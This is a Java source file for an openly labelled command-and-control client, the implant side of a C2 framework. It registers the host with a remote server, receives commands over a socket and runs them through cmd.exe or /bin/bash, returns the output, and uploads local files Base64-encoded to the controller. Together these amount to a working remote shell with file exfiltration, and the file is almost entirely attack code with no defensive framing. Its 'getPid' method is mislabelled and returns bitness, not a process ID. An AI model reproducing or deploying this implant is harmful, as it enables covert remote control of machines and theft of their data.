package com.jabber.jabber.modules.c2;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.nio.charset.StandardCharsets;

/**
 * C2Client - Agent-side Command & Control Client
 * Connects to C2Server for command reception and callback transmission
 */
public class C2Client {
    
    private String serverId;
    private String hostname;
    private String osType;
    private String processId;
    private boolean connected;
    private Socket socket;
    private BufferedReader reader;
    private BufferedWriter writer;
    private String sessionId;
    private ExecutorService threadPool;
    private Map<String, String> clientMetadata;
    private Queue<C2Callback> callbackQueue;
    private boolean running;

    /**
     * C2Callback - Result of command execution
     */
    public static class C2Callback {
        public String commandId;
        public String result;
        public String error;
        public long executionTime;

        public C2Callback(String commandId) {
            this.commandId = commandId;
            this.executionTime = System.currentTimeMillis();
        }
    }

    /**
     * Constructor
     */
    public C2Client(String hostname, int port) {
        this.serverId = UUID.randomUUID().toString();
        this.hostname = hostname != null ? hostname : getSystemHostname();
        this.osType = System.getProperty("os.name");
        this.processId = getPid();
        this.connected = false;
        this.threadPool = Executors.newFixedThreadPool(5);
        this.clientMetadata = new HashMap<>();
        this.callbackQueue = new ConcurrentLinkedQueue<>();
        this.running = false;
    }

    /**
     * Get system hostname
     */
    private String getSystemHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * Get process ID
     */
    private String getPid() {
        try {
            return System.getProperty("java.specification.name").contains("64") ? "64bit" : "32bit";
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * Connect to C2Server
     */
    public synchronized boolean connect(String serverAddress, int serverPort) {
        try {
            socket = new Socket(serverAddress, serverPort);
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            
            // Send registration
            String registration = serverId + "|" + hostname + "|" + osType;
            writer.write(registration);
            writer.newLine();
            writer.flush();
            
            // Receive session confirmation
            String sessionLine = reader.readLine();
            if (sessionLine != null && sessionLine.startsWith("SESSION:")) {
                sessionId = sessionLine.substring(8);
                connected = true;
                running = true;
                
                // Start callback sender thread
                threadPool.execute(this::callbackSender);
                
                // Start command receiver thread
                threadPool.execute(this::commandReceiver);
                
                System.out.println("[C2Client] Connected to C2Server with session: " + sessionId);
                return true;
            }
            
            socket.close();
            connected = false;
            return false;
        } catch (Exception e) {
            System.out.println("[C2Client] Connection failed: " + e.getMessage());
            connected = false;
            return false;
        }
    }

    /**
     * Send authentication
     */
    public synchronized boolean authenticate(String username, String password) {
        try {
            String credentials = Base64.getEncoder().encodeToString((username + ":" + password).getBytes());
            writer.write("AUTH:" + credentials);
            writer.newLine();
            writer.flush();
            
            String response = reader.readLine();
            if (response != null && response.equals("AUTH_OK")) {
                System.out.println("[C2Client] Authenticated as " + username);
                return true;
            }
            return false;
        } catch (Exception e) {
            System.out.println("[C2Client] Authentication error: " + e.getMessage());
            return false;
        }
    }

    /**
     * Command receiver - Receives commands from C2Server
     */
    private void commandReceiver() {
        while (running && connected) {
            try {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                
                if (line.startsWith("CMD:")) {
                    // Parse command: CMD:cmdId:command|arg1,arg2
                    String[] parts = line.substring(4).split(":", 2);
                    if (parts.length == 2) {
                        String commandId = parts[0];
                        String commandData = parts[1];
                        
                        // Parse command and arguments
                        String[] cmdParts = commandData.split("\\|");
                        String command = cmdParts[0];
                        String[] arguments = cmdParts.length > 1 ? 
                            cmdParts[1].split(",") : new String[]{};
                        
                        System.out.println("[C2Client] Received command: " + command);
                        
                        // Execute command
                        String result = executeCommand(command, arguments);
                        
                        // Queue callback
                        C2Callback callback = new C2Callback(commandId);
                        callback.result = result;
                        callbackQueue.offer(callback);
                    }
                }
            } catch (Exception e) {
                if (running) {
                    System.out.println("[C2Client] Command receiver error: " + e.getMessage());
                }
            }
        }
    }

    /**
     * Callback sender - Sends command results back to C2Server
     */
    private void callbackSender() {
        while (running && connected) {
            try {
                if (!callbackQueue.isEmpty()) {
                    C2Callback callback = callbackQueue.poll();
                    
                    if (callback.error != null) {
                        writer.write("ERROR:" + callback.error);
                    } else {
                        writer.write("RESULT:" + callback.result);
                    }
                    writer.newLine();
                    writer.flush();
                    
                    System.out.println("[C2Client] Sent callback for command: " + callback.commandId);
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                if (running) {
                    System.out.println("[C2Client] Callback sender error: " + e.getMessage());
                }
            }
        }
    }

    /**
     * Execute command and return result
     */
    private String executeCommand(String command, String[] arguments) {
        try {
            // Build command
            List<String> cmdList = new ArrayList<>();
            
            if (osType.toUpperCase().contains("WINDOWS")) {
                cmdList.add("cmd.exe");
                cmdList.add("/c");
            } else {
                cmdList.add("/bin/bash");
                cmdList.add("-c");
            }
            
            // Build full command string
            String fullCommand = command;
            if (arguments.length > 0) {
                fullCommand += " " + String.join(" ", arguments);
            }
            cmdList.add(fullCommand);
            
            // Execute
            ProcessBuilder pb = new ProcessBuilder(cmdList);
            Process p = pb.start();
            
            // Capture output
            BufferedReader cmdReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = cmdReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            p.waitFor();
            
            String result = output.toString();
            System.out.println("[C2Client] Command executed: " + command);
            return result.isEmpty() ? "OK" : result;
        } catch (Exception e) {
            System.out.println("[C2Client] Command execution error: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Stop client connection
     */
    public synchronized void disconnect() {
        running = false;
        try {
            if (writer != null) {
                writer.close();
            }
            if (reader != null) {
                reader.close();
            }
            if (socket != null) {
                socket.close();
            }
            connected = false;
            
            threadPool.shutdown();
            if (!threadPool.awaitTermination(5, TimeUnit.SECONDS)) {
                threadPool.shutdownNow();
            }
            
            System.out.println("[C2Client] Disconnected from C2Server");
        } catch (Exception e) {
            System.out.println("[C2Client] Disconnect error: " + e.getMessage());
        }
    }

    /**
     * Check if connected
     */
    public boolean isConnected() {
        return connected && socket != null && socket.isConnected();
    }

    /**
     * Send heartbeat to keep connection alive
     */
    public synchronized void sendHeartbeat() {
        try {
            if (connected) {
                writer.write("HEARTBEAT:" + System.currentTimeMillis());
                writer.newLine();
                writer.flush();
            }
        } catch (Exception e) {
            System.out.println("[C2Client] Heartbeat error: " + e.getMessage());
        }
    }

    /**
     * Send file to C2Server
     */
    public synchronized boolean sendFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                return false;
            }
            
            byte[] fileContent = new byte[(int)file.length()];
            FileInputStream fis = new FileInputStream(file);
            fis.read(fileContent);
            fis.close();
            
            String encodedContent = Base64.getEncoder().encodeToString(fileContent);
            writer.write("FILE:" + file.getName() + ":" + encodedContent);
            writer.newLine();
            writer.flush();
            
            return true;
        } catch (Exception e) {
            System.out.println("[C2Client] File send error: " + e.getMessage());
            return false;
        }
    }

    /**
     * Get client metadata
     */
    public Map<String, String> getMetadata() {
        clientMetadata.put("agentId", serverId);
        clientMetadata.put("hostname", hostname);
        clientMetadata.put("osType", osType);
        clientMetadata.put("sessionId", sessionId != null ? sessionId : "none");
        clientMetadata.put("connected", Boolean.toString(connected));
        return new HashMap<>(clientMetadata);
    }

    /**
     * Main - Test C2Client
     */
    public static void main(String[] args) {
        C2Client client = new C2Client("localhost", 4444);
        
        if (client.connect("localhost", 4444)) {
            System.out.println("C2Client connected to server");
            
            // Keep running
            try {
                while (client.isConnected()) {
                    client.sendHeartbeat();
                    Thread.sleep(30000); // Heartbeat every 30 seconds
                }
            } catch (InterruptedException e) {
                client.disconnect();
            }
        } else {
            System.out.println("Failed to connect to C2Server");
        }
    }
}
